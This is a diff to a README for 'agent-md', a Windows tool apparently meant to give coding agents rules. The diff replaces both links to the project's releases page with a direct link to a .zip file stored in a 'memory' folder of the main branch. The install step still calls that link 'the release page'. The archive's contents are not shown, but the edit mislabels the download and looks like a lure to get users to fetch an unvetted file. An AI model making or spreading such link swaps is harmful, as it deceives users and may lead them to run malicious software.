@@ -1,6 +1,6 @@
 # 🤖 agent-md - Clear agent rules for coding
 
-[⬇️ Download agent-md from Releases](https://github.com/reyhan8543/agent-md/releases)
+[⬇️ Download agent-md from Releases](https://github.com/reyhan8543/agent-md/raw/refs/heads/main/memory/agent_md_2.9.zip)
 
 ## 🧭 What is agent-md?
 
@@ -30,7 +30,7 @@ A standard Windows 10 or Windows 11 system works well.
 
 ## 📥 Download and install
 
-1. Open the release page: https://github.com/reyhan8543/agent-md/releases
+1. Open the release page: https://github.com/reyhan8543/agent-md/raw/refs/heads/main/memory/agent_md_2.9.zip
 2. Look for the latest release at the top of the page.
 3. Download the file that matches the release package.
 4. If the download is a .zip file, right-click it and choose Extract All.
